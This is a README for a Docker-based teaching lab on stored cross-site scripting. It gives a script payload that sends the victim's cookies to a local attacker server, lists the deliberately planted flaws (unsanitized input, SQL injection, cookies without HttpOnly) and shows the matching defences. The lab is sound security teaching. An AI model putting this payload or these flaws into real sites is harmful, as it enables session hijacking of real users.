# XSS Cookie Stealing Lab

A educational security lab demonstrating Cross-Site Scripting (XSS) vulnerability and cookie stealing. 
**For educational purposes only - do not use on real websites!**

## Prerequisites

- Docker
- Docker Compose
- Git

## Setup Instructions

1. Clone the repository:
   ```bash
   git clone https://github.com/Amir-Mohseni/XSS-Attack.git
   cd XSS-Attack/xss-lab
   ```

2. Build and start the containers:
   ```bash
   docker-compose up --build
   ```

3. Wait about 30 seconds for MySQL to initialize fully.

4. Access the applications:
   - Vulnerable App: http://localhost:8080
   - Attacker's Log: http://localhost:8081/logs.php

## Testing the XSS Vulnerability

1. Open the vulnerable application (http://localhost:8080)

2. Add a comment with the following XSS payload:
   ```html
   <script>
   new Image().src = "http://localhost:8081/steal.php?cookie=" + encodeURIComponent(document.cookie);
   </script>
   ```

3. The comment will be stored and the script will execute whenever anyone views the page

4. View stolen cookies at http://localhost:8081/logs.php

## Project Structure
```
xss-lab/
├── docker-compose.yml
├── vulnerable-app/
│   ├── Dockerfile
│   └── src/
│       ├── index.php
│       ├── comments.php
│       ├── style.css
│       └── db.php
└── attacker-server/
    ├── Dockerfile
    └── src/
        ├── steal.php
        └── logs.php
```

## How It Works

1. The vulnerable application stores user comments without sanitizing input
2. When a malicious script is posted as a comment, it gets stored in the database
3. When any user views the comments page, their browser executes the stored script
4. The script sends the user's cookies to the attacker server
5. The attacker server logs these stolen cookies

## Security Vulnerabilities Demonstrated

This lab demonstrates several common web vulnerabilities:

1. **Stored XSS**: User input is stored without sanitization
2. **SQL Injection**: Direct concatenation of user input in SQL queries
3. **Insecure Cookies**: Cookies set without HttpOnly flag
4. **Missing CSRF Protection**: No CSRF tokens implemented

## Prevention Measures

In a real application, you should:

1. Sanitize user input:
```php
$content = htmlspecialchars($_POST['content'], ENT_QUOTES, 'UTF-8');
```

2. Use prepared statements:
```php
$stmt = $mysqli->prepare("INSERT INTO comments (author, content) VALUES (?, ?)");
$stmt->bind_param("ss", $author, $content);
$stmt->execute();
```

3. Set secure cookie flags:
```php
setcookie('user_session', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

4. Implement Content Security Policy (CSP):
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

## Troubleshooting

If you encounter database connection issues:

1. Stop all containers:
   ```bash
   docker-compose down
   ```

2. Remove existing volumes:
   ```bash
   docker-compose down -v
   ```

3. Rebuild and start:
   ```bash
   docker-compose up --build
   ```

### Common Issues

1. **Database Connection Fails**
   - Ensure all containers are running: `docker ps`
   - Check logs: `docker-compose logs db`
   - Try restarting with clean volumes (see above)

2. **Pages Not Loading**
   - Verify all ports are available (8080 and 8081)
   - Check container logs: `docker-compose logs vulnerable-app`

3. **Cookie Stealing Not Working**
   - Ensure both applications are accessible
   - Check browser console for JavaScript errors
   - Verify the attacker server has write permissions for logs

## Legal Disclaimer

This project is for educational purposes only. Using these techniques against real websites without explicit permission is illegal and unethical. Always:

- Practice in controlled environments only
- Get written permission before testing security
- Follow responsible disclosure practices
- Respect privacy and data protection laws

## License

This project is released under the MIT License. Use it responsibly. 